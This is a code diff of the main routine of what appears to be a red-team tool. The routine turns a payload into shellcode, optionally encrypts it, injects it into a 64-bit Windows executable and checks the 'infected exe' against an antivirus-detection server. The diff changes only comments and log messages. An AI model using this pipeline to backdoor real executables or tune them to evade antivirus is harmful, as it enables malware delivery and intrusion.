@@ -131,13 +131,13 @@ def start(settings: Settings) -> int:
 
 
 def start_real(settings: Settings):
-    """Main entry point for the application. This is where the magic happens, based on settings"""
+    """Main entry point for the application. This is where the magic happens (based on settings)"""
 
     # Load our input
     project = Project(settings)
     project.init()
 
-    # check if 64 bit
+    # CHECK if 64 bit
     if not project.carrier.superpe.is_64():
         raise Exception("Binary is not 64bit: {}".format(project.settings.inject_exe_in))
 
@@ -147,19 +147,20 @@ def start_real(settings: Settings):
         project.settings.decoder_style.value,
         project.settings.carrier_invoke_style.value))
 
-    # Create: Carrier C source files from template (C->C)
+    # CREATE: Carrier C source files from template (C->C)
     phases.templater.create_c_from_template(settings, project.payload.len)
 
     # If we put the payload into .rdata
-    # Prepare DataReuseEntry for usage in Compiler/AsmParser
+    # PREPARE DataReuseEntry for usage in Compiler/AsmParser
     if settings.payload_location == PayloadLocation.DATA:
         logger.info("--[ Load payload for use in .rdata injection")
         project.carrier.add_datareuse_fixup(DataReuseEntry("supermega_payload"))
         entry = project.carrier.get_reusedata_fixup("supermega_payload")
-        entry.data = phases.assembler.encode_payload(project.payload.payload_data, settings.decoder_style)  # encrypt if selected
+        entry.data = phases.assembler.encode_payload(
+            project.payload.payload_data, settings.decoder_style)  # encrypt
         observer.add_code_file("payload_data", project.payload.payload_data)
 
-    # Compile: Carrier to .asm (C -> ASM)
+    # COMPILE: Carrier to .asm (C -> ASM)
     if settings.generate_asm_from_c:
         phases.compiler.compile(
             c_in = settings.main_c_path, 
@@ -168,23 +169,23 @@ def start_real(settings: Settings):
             settings = project.settings)
         
     # we have the carrier-required IAT entries in carrier.iat_requests
-    # Check if all are available in infectable, or abort (early check)
+    # CHECK if all are available in infectable, or abort (early check)
     if settings.source_style == FunctionInvokeStyle.iat_reuse:
         functions = project.carrier.get_unresolved_iat()
         if len(functions) != 0:
             if settings.fix_missing_iat:
-                logger.info("Fixing missing IAT entries: {}".format(", ".join(functions)))
+                logger.info("--[ Fixing missing IAT entries: {}".format(", ".join(functions)))
             else:
                 raise Exception("IAT entry not found: {}".format(", ".join(functions)))
 
-    # Assemble: Assemble .asm to .shc (ASM -> SHC)
+    # ASSEMBLE: Assemble .asm to .shc (ASM -> SHC)
     if settings.generate_shc_from_asm:
         carrier_shellcode: bytes = phases.assembler.asm_to_shellcode(
             asm_in = settings.main_asm_path, 
             build_exe = settings.main_exe_path)
         observer.add_code_file("carrier_shc", carrier_shellcode)
 
-    # Merge: shellcode/loader with payload (SHC + PAYLOAD -> SHC)
+    # MERGE: shellcode/loader with payload (SHC + PAYLOAD -> SHC)
     if settings.payload_location == PayloadLocation.CODE:
         logger.info("--[ Merge carrier with payload for .text injection".format())
         full_shellcode = phases.assembler.merge_loader_payload(
@@ -205,10 +206,11 @@ def start_real(settings: Settings):
     #    observer.add_code_file("payload_sgn", file_readall_binary(settings.main_shc_path + ".sgn"))
     #    shutil.move(settings.main_shc_path + ".sgn", settings.main_shc_path)
 
-    # inject merged loader into an exe
+    # inject (merged) loader into an exe. Big task.
     phases.injector.inject_exe(full_shellcode, settings, project.carrier)
     observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))
 
+    # Check binary with avred
     if config.get("avred_server") != "":
         if settings.verify or settings.try_start_final_infected_exe:
             filename = os.path.basename(settings.inject_exe_in)
@@ -216,7 +218,7 @@ def start_real(settings: Settings):
                 data = f.read()
             scannerDetectsBytes(data, filename, useBrotli=True, verify=settings.verify)
     else:
-        # Start/verify it at the end
+        # Support automated verification (dev)
         if settings.verify:
             logger.info("--[ Verify infected exe")
             payload_exit_code = phases.injector.verify_injected_exe(
